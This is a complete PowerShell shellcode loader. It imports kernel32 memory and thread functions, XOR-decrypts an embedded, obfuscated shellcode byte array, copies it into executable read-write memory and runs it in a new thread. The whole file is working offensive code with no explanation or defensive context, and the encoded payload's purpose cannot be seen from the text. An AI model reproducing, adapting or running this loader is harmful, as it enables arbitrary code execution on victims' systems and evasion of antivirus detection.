# Define Kernel32 API functions
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class WinAPI {
    [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress,
        uint dwSize,
        uint flAllocationType,
        uint flProtect
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes,
        uint dwStackSize,
        IntPtr lpStartAddress,
        IntPtr lpParameter,
        uint dwCreationFlags,
        out IntPtr lpThreadId
    );

    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern uint WaitForSingleObject(
        IntPtr hHandle,
        uint dwMilliseconds
    );
}
"@

# Add the Kernel32 API definitions as a type
Add-Type -TypeDefinition $Kernel32

# XOR decryption key
[Byte[]] $XORkey = 0xef, 0x78, 0x13, 0xbd, 0xb1, 0x61, 0xeb, 0xf7, 0xf1, 0x63, 0xef, 0xef, 0x8d, 0x6f, 0xc1, 0x75

# Encrypted shellcode
[Byte[]] $XORshellcode = 0x13, 0x30, 0x90, 0x59, 0x41, 0x89, 0x27, 0xf7, 0xf1, 0x63, 0xae, 0xbe, 0xcc, 0x3f, 0x93, 0x3d, 0xde, 0xaa, 0x76, 0xf5, 0x3a, 0x33, 0x8b, 0xbf, 0x7a, 0x31, 0xf7, 0xbe, 0xdb, 0x27, 0x4a, 0x27, 0xcf, 0x30, 0x1c, 0x0a, 0xfb, 0x2b, 0xa3, 0x7c, 0x83, 0x33, 0xa2, 0xde, 0x44, 0x27, 0xf0, 0xb5, 0x43, 0x44, 0x72, 0xc1, 0xb3, 0x4d, 0xcb, 0xb6, 0x30, 0xaa, 0xe2, 0xae, 0x8c, 0xae, 0x23, 0x98, 0xbd, 0x39, 0x42, 0xf5, 0x3a, 0x33, 0xcb, 0x7c, 0xb3, 0x5f, 0xa7, 0xee, 0x5d, 0x09, 0x40, 0x0d, 0xf7, 0x73, 0x11, 0xb2, 0x34, 0x13, 0xeb, 0xf7, 0xf1, 0xe8, 0x6f, 0x67, 0x8d, 0x6f, 0xc1, 0x3d, 0x6a, 0xb8, 0x67, 0xda, 0xf9, 0x60, 0x3b, 0xa7, 0x7a, 0x2b, 0xf7, 0xab, 0x06, 0x2f, 0xe1, 0x3c, 0xee, 0xa8, 0xf0, 0xeb, 0xfc, 0x50, 0x22, 0xbf, 0x0e, 0xaa, 0xae, 0x64, 0xb9, 0xe7, 0x89, 0x74, 0x39, 0x30, 0x22, 0x7d, 0x1d, 0x20, 0x2a, 0x3e, 0xfc, 0x22, 0xee, 0x2e, 0xb5, 0x8f, 0xb4, 0x84, 0xa3, 0x7b, 0x5f, 0x99, 0xb9, 0x24, 0xd2, 0x26, 0x84, 0xbb, 0xb7, 0xab, 0x06, 0x2f, 0xe5, 0x3c, 0xee, 0xa8, 0x75, 0xfc, 0x3a, 0x6d, 0xa3, 0xb3, 0x7a, 0x23, 0xf3, 0xa6, 0x8c, 0xbf, 0x80, 0xfe, 0xeb, 0xf0, 0x52, 0xe5, 0xf0, 0x39, 0xb5, 0xbf, 0xf0, 0xb3, 0xb6, 0xb5, 0xcc, 0x37, 0x80, 0x2c, 0xae, 0x22, 0x5b, 0x3e, 0x5d, 0x41, 0xaa, 0xa5, 0x0e, 0x83, 0xb7, 0xae, 0xd4, 0x35, 0x89, 0xfe, 0xfd, 0x91, 0x58, 0x42, 0x4e, 0x9e, 0xb6, 0xbe, 0x4f, 0x14, 0x9c, 0xdd, 0xd2, 0x5c, 0xf3, 0x75, 0xef, 0x39, 0x45, 0xf4, 0x38, 0x87, 0xa3, 0x76, 0x1d, 0xc3, 0xee, 0xef, 0x8d, 0x26, 0x48, 0x90, 0xa6, 0xc4, 0x11, 0xbd, 0xae, 0xf2, 0x2b, 0x5f, 0xdc, 0xd8, 0xae, 0xbb, 0xc4, 0xe6, 0x25, 0x39, 0x66, 0x89, 0x52, 0x07, 0xfd, 0x16, 0xcd, 0xf0, 0x0e, 0xb6, 0xa3, 0x66, 0x67, 0x07, 0xc0, 0x74, 0xef, 0x78, 0x4a, 0xfc, 0x0b, 0x48, 0x6b, 0x9c, 0xf1, 0x9c, 0x3a, 0x85, 0x87, 0x2e, 0x9f, 0x25, 0xbf, 0x35, 0x22, 0x74, 0xfc, 0x50, 0x2b, 0xbf, 0x0e, 0xa3, 0xa7, 0x66, 0x4f, 0x27, 0x3e, 0xb5, 0xa7, 0xf1, 0xd2, 0xfc, 0x0b, 0x8b, 0xe4, 0x28, 0x11, 0x9c, 0x3a, 0xa7, 0x04, 0xa8, 0xab, 0x65, 0xae, 0x20, 0x5f, 0x34, 0x53, 0x29, 0x62, 0x0e, 0xb0, 0xd9, 0x76, 0x4a, 0xf9, 0x0e, 0x3e, 0xa0, 0x6a, 0xb8, 0x67, 0xb7, 0xf8, 0x9e, 0x25, 0x82, 0x14, 0x8b, 0x7c, 0xef, 0x8d, 0x6f, 0x89, 0xf6, 0x03, 0x68, 0x5b, 0x34, 0x53, 0x2c, 0xda, 0x3e, 0x9b, 0x67, 0xae, 0xb7, 0xc5, 0xe6, 0x38, 0x34, 0x55, 0x7a, 0xca, 0x75, 0xee, 0x9e, 0x3e, 0x74, 0x09, 0x63, 0x91, 0xba, 0xc5, 0xec, 0x05, 0x55, 0xb1, 0xf1, 0xe5, 0xd7, 0xf1, 0x20, 0xb2, 0x9f, 0xf1, 0x73, 0xef, 0xef, 0xcc, 0x37, 0x89, 0xfc, 0x1d, 0x30, 0x22, 0x74, 0xf0, 0xdb, 0xb3, 0x53, 0xa2, 0x86, 0x10, 0x3a, 0xc5, 0xe6, 0x02, 0x3c, 0x66, 0xbf, 0x5e, 0x8c, 0x78, 0x28, 0x62, 0x07, 0xb9, 0xea, 0x35, 0xa7, 0x04, 0x96, 0x80, 0xcf, 0xed, 0xa1, 0xdb, 0xe2, 0x4e, 0xb4, 0x68, 0x0f, 0xf1, 0x1e, 0xc7, 0xb7, 0xcc, 0x38, 0x98, 0x1d, 0xef, 0x38, 0x13, 0xbd, 0xf0, 0x39, 0x81, 0xf7, 0xab, 0x22, 0x55, 0xe4, 0xa2, 0x60, 0xf1, 0x8a, 0x3a, 0x2f, 0x4a, 0xfc, 0x0b, 0x14, 0x85, 0xba, 0x90, 0x9c, 0x3a, 0xa6, 0x72, 0xa1, 0x28, 0x49, 0x10, 0x87, 0xec, 0xf5, 0xb0, 0xa2, 0xa3, 0xde, 0x37, 0x2b, 0x6a, 0x19, 0xf8, 0xdb, 0x80, 0x8a, 0x08, 0x20, 0x79, 0xbd, 0xe8, 0x28, 0x2c, 0x35, 0x01, 0xd6, 0x4d, 0xb9, 0x72, 0xba

# Decrypt the XOR-encrypted shellcode
for ($i = 0; $i -lt $XORshellcode.Length; $i++) {
    $XORshellcode[$i] = $XORshellcode[$i] -bxor $XORkey[$i % $XORkey.Length]
}

# Allocate memory for the shellcode
$MEM_COMMIT = 0x1000
$MEM_RESERVE = 0x2000
$PAGE_EXECUTE_READWRITE = 0x40
$size = $XORshellcode.Length

$allocatedMemory = [WinAPI]::VirtualAlloc([IntPtr]::Zero, $size, $MEM_COMMIT -bor $MEM_RESERVE, $PAGE_EXECUTE_READWRITE)
if (-not $allocatedMemory) {
    Write-Error "Failed to allocate memory."
    exit 1
}

Write-Host "Memory allocated at: $allocatedMemory"

# Copy the shellcode into allocated memory
[System.Runtime.InteropServices.Marshal]::Copy($XORshellcode, 0, $allocatedMemory, $size)
Write-Host "Shellcode copied into allocated memory."

# Create a thread to execute the shellcode
$threadId = [IntPtr]::Zero
$hThread = [WinAPI]::CreateThread([IntPtr]::Zero, 0, $allocatedMemory, [IntPtr]::Zero, 0, [ref]$threadId)
if (-not $hThread) {
    Write-Error "Failed to create thread."
    exit 1
}

Write-Host "Thread created with ID: $threadId"

# Wait for the thread to finish executing
[WinAPI]::WaitForSingleObject($hThread, [System.UInt32]::MaxValue)
